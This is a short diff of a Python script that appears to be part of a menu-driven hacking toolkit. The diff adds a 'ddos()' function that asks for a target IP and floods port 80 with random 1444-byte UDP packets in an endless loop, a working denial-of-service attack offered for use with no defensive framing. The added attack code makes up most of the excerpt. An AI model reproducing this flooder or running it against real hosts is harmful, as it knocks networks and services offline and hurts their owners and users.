@@ -642,7 +642,18 @@ def sql():
 	 	print(r + '[!]' + w + 'Try Again')
 	 	sql()
 
-		 	 
+def ddos():
+	os.system("clear")
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	bytes = random._urandom(1444)
+	ip = input("ENTER IP :  ")
+	port = 80
+	while True:
+		try:
+			s.sendto(bytes, (ip,port))
+			print("Sending packets..")
+		except KeyboardInterrupt:
+			break		 	 
 	
 def info():
 	print()
